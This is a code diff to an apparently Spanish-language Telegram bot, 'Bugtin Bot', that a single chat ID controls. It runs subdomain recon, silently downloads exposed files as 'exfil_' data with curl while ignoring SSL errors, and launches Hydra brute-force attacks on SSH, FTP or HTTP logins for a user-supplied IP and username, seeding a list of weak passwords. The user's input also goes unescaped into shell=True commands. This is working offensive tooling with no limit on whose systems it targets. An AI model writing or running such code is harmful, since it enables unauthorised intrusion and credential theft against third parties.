@@ -11,6 +11,24 @@ YOUR_CHAT_ID = "6280594821"
 
 bot = telebot.TeleBot(TOKEN)
 
+# --- DETECTOR DE RUTA PARA HYDRA CLONADO (hydra.sh) ---
+def obtener_comando_hydra():
+    # 1. Intenta ver si está instalado globalmente
+    check = subprocess.run("command -v hydra", shell=True, capture_output=True)
+    if check.returncode == 0:
+        return "hydra"
+    
+    # 2. Busca el script local hydra.sh en la carpeta hermana
+    ruta_script = os.path.abspath(os.path.join(os.getcwd(), "..", "hydra", "hydra.sh"))
+    
+    if os.path.exists(ruta_script):
+        # Asegura permisos de ejecución
+        subprocess.run(f"chmod +x {ruta_script}", shell=True)
+        # Retornamos el comando precedido por bash para asegurar su ejecución
+        return f"bash {ruta_script}"
+        
+    return None
+
 # --- MOTOR DE ANÁLISIS E IMPACTO ---
 def analizar_y_explicar(archivo_reporte):
     impacto = "🔵 **ANÁLISIS DE IMPACTO**\n"
@@ -35,12 +53,10 @@ def analizar_y_explicar(archivo_reporte):
 def descargar_filtracion(url, chat_id):
     try:
         clean_url = url.strip()
-        # Limpiar nombre de archivo para evitar errores de sistema
         file_name = "exfil_" + clean_url.split("/")[-1].split(" ")[0].replace(":", "_").replace("?", "_")
         if not file_name or len(file_name) < 5: 
             file_name = f"exfil_data_{int(time.time())}.txt"
 
-        # Descarga silenciosa ignorando errores de certificado SSL
         subprocess.run(f"curl -s -k -L {clean_url} -o {file_name}", shell=True)
         
         if os.path.exists(file_name) and os.path.getsize(file_name) > 10:
@@ -55,11 +71,11 @@ def descargar_filtracion(url, chat_id):
 def send_welcome(message):
     if str(message.chat.id) == YOUR_CHAT_ID:
         help_text = (
-            "🤖 **Bugtin Bot v7.5 - Hydra Ready**\n\n"
+            "🤖 **Bugtin Bot v8.7 - Hydra.sh Mode**\n\n"
             "📡 `/subs` - Recon de subdominios.\n"
             "🔓 `/archivos` - Escaneo y exfiltración automática.\n"
-            "⚡ `/fuerza` - Ataque Hydra (SSH, FTP, HTTP).\n\n"
-            "🚀 *Usa los botones o comandos para operar.*"
+            "⚡ `/fuerza` - Ataque vía `hydra.sh`.\n\n"
+            "🚀 *Estado: Configurado para usar script local.*"
         )
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add("📡 Solo Subdominios", "🔓 Buscar Archivos Expuestos")
@@ -90,6 +106,7 @@ def process_subdomains_step(message):
         if os.path.exists(output) and os.path.getsize(output) > 0:
             with open(output, "rb") as f:
                 bot.send_document(chat_id, f, caption=f"🏁 Reconocimiento: {target}")
+            os.remove(output)
         else:
             bot.send_message(chat_id, "❌ No se encontraron resultados.")
     except Exception as e:
@@ -123,12 +140,13 @@ def process_vulns_step(message):
             
             with open(report_file, "rb") as doc:
                 bot.send_document(chat_id, doc, caption=f"📄 Reporte de auditoría: {target}")
+            os.remove(report_file)
         else:
             bot.send_message(chat_id, f"✅ No se detectaron vulnerabilidades en `{target}`.")
     except Exception as e:
         bot.send_message(chat_id, f"⚠️ Error: {str(e)}")
 
-# --- LÓGICA: FUERZA BRUTA (Hydra) ---
+# --- LÓGICA: FUERZA BRUTA (Hydra Clonado) ---
 @bot.message_handler(commands=['fuerza'])
 def start_fuerza(message):
     if str(message.chat.id) == YOUR_CHAT_ID:
@@ -137,6 +155,12 @@ def start_fuerza(message):
 
 def process_fuerza_step(message):
     try:
+        comando_base = obtener_comando_hydra()
+        
+        if not comando_base:
+            bot.send_message(message.chat.id, "❌ **Hydra no encontrado.**\nAsegúrate de que el archivo `hydra.sh` esté en `../hydra/hydra.sh`.")
+            return
+
         data = message.text.split()
         if len(data) < 3:
             bot.send_message(message.chat.id, "❌ Formato: `IP Servicio Usuario` (ej: 10.0.0.1 ftp admin)")
@@ -145,15 +169,15 @@ def process_fuerza_step(message):
         ip, servicio, user = data[0], data[1], data[2]
         chat_id = message.chat.id
         pass_list = "passwords.txt"
+        res_file = "hydra_res.txt"
         
         if not os.path.exists(pass_list):
             with open(pass_list, "w") as f: f.write("admin\n123456\npassword\nroot\n12345")
 
-        bot.send_message(chat_id, f"⚡ Atacando `{ip}` vía `{servicio}` para `{user}`...")
+        bot.send_message(chat_id, f"⚡ Atacando `{ip}` usando `{comando_base}`...")
         
-        res_file = "hydra_res.txt"
-        # El bot llama al binario de hydra que instalaste en el sistema
-        subprocess.run(f"hydra -l {user} -P {pass_list} -t 4 -f {ip} {servicio} -o {res_file}", shell=True)
+        # Ejecutamos el ataque
+        subprocess.run(f"{comando_base} -l {user} -P {pass_list} -t 4 -f {ip} {servicio} -o {res_file}", shell=True)
         
         if os.path.exists(res_file) and os.path.getsize(res_file) > 0:
             with open(res_file, "r") as f:
@@ -163,7 +187,7 @@ def process_fuerza_step(message):
             bot.send_message(chat_id, f"❌ No se encontró la contraseña para el usuario `{user}`.")
             
     except Exception as e:
-        bot.send_message(message.chat.id, f"⚠️ Error: Asegúrate de que Hydra esté instalado correctamente.")
+        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")
 
 # --- BOTONES ---
 @bot.message_handler(func=lambda m: m.text == "📡 Solo Subdominios")
@@ -173,5 +197,5 @@ def btn_arch(m): start_archivos(m)
 @bot.message_handler(func=lambda m: m.text == "⚡ Ataque de Fuerza Bruta")
 def btn_fuerza(m): start_fuerza(m)
 
-print("🚀 Bugtin Bot v7.5 Online. Hydra integrado.")
+print("🚀 Bugtin Bot v8.7 Online. Usando hydra.sh para fuerza bruta.")
 bot.polling()
